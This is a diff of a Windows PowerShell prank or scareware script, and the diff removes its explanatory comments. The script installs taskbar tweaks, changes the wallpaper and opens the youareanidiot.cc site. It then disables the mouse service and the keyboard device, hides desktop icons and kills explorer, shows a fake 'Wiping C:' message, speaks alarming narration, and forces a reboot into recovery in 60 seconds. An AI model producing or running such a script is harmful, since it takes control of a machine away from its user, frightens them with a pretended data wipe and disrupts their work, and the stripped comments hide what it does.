@@ -1,12 +1,7 @@
-# change taskbar to Windows 95 style
 winget install --id=dremin.RetroBar  -e --source winget
 retrobar
-# install ExplorerPatcher
 winget install --id=valinet.ExplorerPatcher  -e --source winget
-# set verbose shutdown = true
-|| || |Registry Hive|HKEY_LOCAL_MACHINE| |Registry Path|Software\Microsoft\Windows\CurrentVersion\Policies\System| |Value Name|VerboseStatus| |Value Type|REG_DWORD| |Enabled Value|1| |Disabled Value|0|
 
-# change wallpaper
 $setwallpapersrc = @"
 using System.Runtime.InteropServices;
 
@@ -27,31 +22,24 @@ Add-Type -TypeDefinition $setwallpapersrc
 [Wallpaper]::SetWallpaper("C:\Windows\web\Wallpaper\Windows\img0.jpg")
 
 
-# launch youareanidiot
 firefox https://youareanidiot.cc
 
-# stop mouse
 sc stop mouhid
 Get-PnpDevice -FriendlyName 'HID Keyboard Device' | Disable-PnpDevice -ErrorAction SilentlyContinue
 
-# Hide all icons on Desktop
 $Path="HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced"
 Set-ItemProperty -Path $Path -Name "HideIcons" -Value 1
 Get-Process "explorer"| Stop-Process
 
-# fake wipe C:
 echo "Wiping C: ... task busy"
 Start-Sleep -Seconds 5
 echo "Operation Stopped: %systemroot% write protected"
 echo "Operation Completed Successfully"
 
-# narraattor
 $voice = New-Object -ComObject Sapi.spvoice
 $voice.rate = 0
 $voice.speak("narrator enabled Microsoft windows windows search kill child process poweroff terminate child conhost conhost conhost")
 
-# open conhost and instantly exit
 conhost cmd exit
 
-# reboot (to recovery in 60s)
 shutdown /r /o /t 60
